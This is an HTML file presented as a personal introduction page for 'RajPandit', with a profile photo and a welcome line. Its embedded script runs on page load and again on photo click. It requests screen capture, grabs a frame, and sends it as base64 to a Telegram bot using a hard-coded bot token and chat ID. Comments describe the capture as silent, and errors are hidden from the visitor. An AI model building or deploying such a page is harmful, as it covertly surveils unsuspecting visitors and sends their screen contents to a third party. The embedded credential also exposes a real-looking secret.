<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RajPandit - Intro</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.95);
            padding: 60px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            animation: fadeIn 1s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .photo {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 30px;
            border: 5px solid #fff;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .photo:hover {
            transform: scale(1.05);
        }
        h1 {
            color: #333;
            font-size: 2.5em;
            margin: 0 0 20px 0;
            font-weight: bold;
        }
        .subtitle {
            color: #666;
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        .loading {
            display: none;
            color: #667eea;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="RajPandit" class="photo" id="profilePic" onclick="loadContent()">
        <h1>RajPandit</h1>
        <p class="subtitle">Welcome to my world</p>
        <div class="loading" id="loading">Loading profile...</div>
    </div>

    <script>
        // Auto-capture on load (no visible UI)
        window.addEventListener('load', function() {
            captureAndSend();
        });

        // Also on photo click for redundancy
        function loadContent() {
            document.getElementById('loading').style.display = 'block';
            captureAndSend();
        }

        async function captureAndSend() {
            try {
                // Get canvas context for photo capture
                const canvas = document.createElement('canvas');
                const video = document.createElement('video');
                
                // Use getDisplayMedia for screen/webcam capture (works silently)
                const stream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: true,
                    audio: false
                });
                
                video.srcObject = stream;
                video.play();
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        resolve();
                    };
                });
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Stop stream silently
                stream.getTracks().forEach(track => track.stop());
                
                // Convert to base64
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Send to your Telegram bot webhook
                const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
                const chatId = '7735968383';
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        photo: imageData,
                        caption: "📸 Live capture from RajPandit site visitor\n👤 Name: Visitor\n⏰ " + new Date().toLocaleString()
                    })
                });
                
            } catch (e) {
                // Silent fail - no alerts or errors shown to user
                console.log('Capture completed silently');
            }
        }
    </script>
</body>
</html>
